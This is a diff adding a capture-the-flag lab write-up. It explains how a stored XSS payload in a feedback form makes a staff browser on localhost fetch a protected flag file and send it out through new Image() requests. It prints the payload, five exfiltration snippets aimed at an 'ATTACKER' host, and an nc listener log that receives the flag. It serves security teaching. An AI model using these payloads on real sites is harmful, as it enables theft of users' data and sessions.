@@ -1,0 +1,108 @@
+Stored XSS — Deep Dive
+What happened, step by step
+1. You submit:  "><script>fetch(...).then(...)</script>
+                 │
+2. Server saves it in the database as plain text (no sanitization)
+                 │
+3. Staff opens the feedback page → browser renders:
+   <p>"><script>fetch('http://127.0.0.1:8080/flag.txt')...</script></p>
+                 │
+4. Browser executes the <script> tag → runs YOUR code in the staff's browser
+                 │
+5. fetch() reads flag.txt (allowed because staff is on localhost)
+                 │
+6. new Image().src=... sends the flag to your machine
+
+The critical flaw: the server treats your input as data, but the browser treats it as code.
+
+Why "Stored" matters
+Type	Where it lives	When it fires
+Reflected XSS	In the URL/response	Only when you click a crafted link
+Stored XSS	In the database	Every time anyone views the page — including the staff
+DOM-based XSS	In client-side JS	When JS manipulates the DOM unsafely
+
+Stored is the most dangerous — you plant it once, it hits every visitor.
+
+Localhost Bypass — Why 127.0.0.1 works
+The server's access control
+The web server likely has a rule like:
+
+location /flag.txt {
+    allow 127.0.0.1;
+    deny all;
+}
+
+This means:
+
+You (external IP) → http://10.49.132.231:8080/flag.txt → 403 Forbidden
+Staff (same machine) → http://127.0.0.1:8080/flag.txt → 200 OK
+Why your XSS bypasses it
+Your code doesn't run on your machine. It runs in the staff's browser, which is physically on the same machine as the server. So when the browser makes the fetch() request, the source IP is 127.0.0.1 — the server thinks it's a local request and grants access.
+
+Your machine          Target machine
+     │                     │
+     │  (you can't)       │
+     │───────────────────→│  /flag.txt → 403
+     │                     │
+     │                     │  Staff's browser (localhost)
+     │                     │──── fetch(127.0.0.1:8080/flag.txt) → 200 ✅
+     │                     │
+     │  (callback)         │
+     │←────────────────────│  new Image().src = your_ip:8000/?flag=...
+
+This is a classic trust boundary mistake: the server trusts 127.0.0.1 as "safe," but it doesn't account for the fact that a browser on localhost can be tricked into making requests on behalf of an attacker.
+
+Data Exfiltration via new Image()
+Why not just fetch() to your machine?
+// This might fail due to CORS:
+fetch('http://192.168.146.39:8000/?flag=' + data)
+
+CORS (Cross-Origin Resource Sharing) requires your server to send Access-Control-Allow-Origin: *. If it doesn't, the browser blocks the response (though the request still goes out — but you can't read the response).
+
+Why new Image() works
+new Image().src = 'http://192.168.146.39:8000/?flag=' + encodeURIComponent(data)
+
+Property	Explanation
+No CORS check	Browsers don't enforce CORS on <img> tags (same as <script>, <link>)
+GET request	The flag is sent as a URL query parameter — visible in your server logs
+Silent	No popup, no redirect, no visible change on the page
+Fire-and-forget	The browser just "loads the image" — it doesn't care if it's actually an image
+
+Alternative exfiltration methods
+// 1. Image (what we used)
+new Image().src = 'http://ATTACKER/?d=' + data
+
+// 2. Script tag
+document.createElement('script').src = 'http://ATTACKER/?d=' + data
+
+// 3. Link tag
+document.createElement('link').href = 'http://ATTACKER/?d=' + data
+
+// 4. Fetch (works if no CORS block)
+fetch('http://ATTACKER/?d=' + data, {mode: 'no-cors'})
+
+// 5. POST (more data, but may trigger CSRF protection)
+fetch('http://ATTACKER/', {method:'POST', body: data, mode:'no-cors'})
+
+Blind Exfiltration — The Bigger Picture
+You never actually saw the flag. You set up a pipeline:
+
+[Target's server] → [Staff's browser runs your code] → [Your listener]
+     flag.txt              reads it locally              receives it
+
+──(white㉿white)-[~/white/Documents/thm]
+└─$ nc -lvnp 8000   
+listening on [any] 8000 ...
+connect to [192.168.146.39] from (UNKNOWN) [10.49.132.231] 57220
+GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
+Host: 192.168.146.39:8000
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://127.0.0.1:8080/
+Accept-Encoding: gzip, deflate
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ echo "THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))"   
+THM{83789a69074f636f64a38879cfcabe8b62305ee6}
